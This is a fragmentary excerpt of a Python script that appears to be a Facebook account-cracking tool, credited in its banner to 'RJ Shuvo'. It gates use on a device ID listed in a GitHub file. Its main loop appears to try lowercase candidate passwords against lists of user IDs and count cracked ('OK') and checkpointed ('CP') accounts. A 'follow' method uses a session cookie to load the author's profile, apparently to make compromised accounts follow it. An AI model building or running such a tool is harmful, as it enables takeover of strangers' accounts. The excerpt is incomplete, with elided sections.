...
\033[1;97m-----------------------------------------------
\033[1;96m➣ \033[1;93mPROGRAMER   \033[1;96m: \033[1;93mRJ Shuvo
\033[1;96m➣ \033[1;93mFACEBOOK    \033[1;96m: \033[1;93mRJ-Shuvo
...
def check():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/SHAN-0007/bsn/main/z.txt').text
    if id in httpCaht:
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;97m[\x1b[1;96mSHAN\x1b[1;97m] {loop}\x1b[1;93m/\x1b[1;97m{len(self.id)} \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m{len(ok)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/shahnoor.780', cookies={'cookie': coki}).text, 'html.parser')
